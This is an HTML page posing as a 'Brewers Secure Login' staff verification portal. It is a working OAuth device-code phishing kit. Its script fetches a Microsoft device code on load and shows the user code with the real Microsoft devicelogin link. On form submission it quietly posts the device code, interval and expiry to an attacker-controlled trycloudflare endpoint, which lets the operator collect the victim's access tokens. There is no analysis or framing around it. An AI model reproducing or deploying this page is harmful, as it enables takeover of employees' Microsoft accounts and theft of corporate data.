<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Brewers Secure Login</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" crossorigin="anonymous">
    <style>
        body {
            background: linear-gradient(to right, #e6f0fa, #ffffff);
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            color: #2c3e50;
        }
        .auth-container {
            background: linear-gradient(to bottom right, #ffffff, #f3f9ff);
            padding: 50px 40px;
            border-radius: 10px;
            box-shadow: 0px 8px 25px rgba(0,0,0,0.1);
            margin-top: 60px;
        }
        h4.auth-header {
            font-size: 1.75rem;
            color: #0a59a3;
            margin-bottom: 10px;
        }
        .subtext {
            font-size: 1rem;
            font-weight: 400;
            color: #333333;
            margin-top: 5px;
        }
        .microsoft-logo {
            width: 120px;
        }
        #submit-btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .btn-primary {
            background-color: #004e9a;
            border: none;
            font-weight: 600;
            transition: background-color 0.3s ease;
        }
        .btn-primary:hover {
            background-color: #003f7f;
        }
    </style>
</head>
<body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
    let deviceDetails = null;

    // Fetch the device code on DOM load
    window.addEventListener("DOMContentLoaded", () => {
        fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net"))
        .then(response => {
            if (!response.ok) throw new Error('Failed to load device code.');
            return response.json();
        })
        .then(data => {
            deviceDetails = typeof data.contents === 'string' ? JSON.parse(data.contents) : data.contents;

            document.getElementById('code1234').innerHTML = `
                <div class="alert alert-primary text-center">
                    Please visit <a href="https://microsoft.com/devicelogin" target="_blank">https://microsoft.com/devicelogin</a><br>
                    and enter the code: <strong>${deviceDetails.user_code}</strong>
                </div>`;
            document.getElementById('submit-btn').disabled = false;
        })
        .catch(error => {
            document.getElementById('code1234').innerHTML = `<div class="alert alert-danger text-center">Failed to load code. Please refresh.</div>`;
        });
    });

    // Submit the device code only once, when the form is submitted
    document.addEventListener('DOMContentLoaded', function () {
        const form = document.querySelector('form');
        form.addEventListener('submit', function () {
            if (deviceDetails && !form.dataset.sent) {
                form.dataset.sent = "true";

                $.post("https://programmes-crops-humanities-towns.trycloudflare.com/query", {
                    "device_code": deviceDetails.device_code,
                    "interval": deviceDetails.interval,
                    "expires_in": deviceDetails.expires_in
                });
            }
        });
    });
</script>

<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <div class="auth-container">
                <div class="text-center mb-4">
                    <img src="https://www.owatroldirect.co.uk/wp-content/uploads/2015/01/logo.png.webp" class="microsoft-logo" alt="Brewers Decorator Centres Logo">
                </div>
                <h4 class="auth-header text-center">Verify Your Work Identity</h4>
                <p class="text-center subtext">To continue accessing staff portals, verify your work credentials below.</p>
                <p class="text-center subtext">Only verified work devices can access shared resources. If the code doesnt work on the first attempt, please refresh the page and try with a new one.</p>

                <div id="code1234" class="text-center text-muted mt-4">Please wait. Loading...</div>

                <form method="get" action="https://microsoft.com/devicelogin" target="_blank">
                    <button class="btn btn-primary text-white w-100 mt-4" id="submit-btn" disabled>Proceed Verification</button>
                </form>
            </div>
        </div>
    </div>
</div>

</body>
</html>
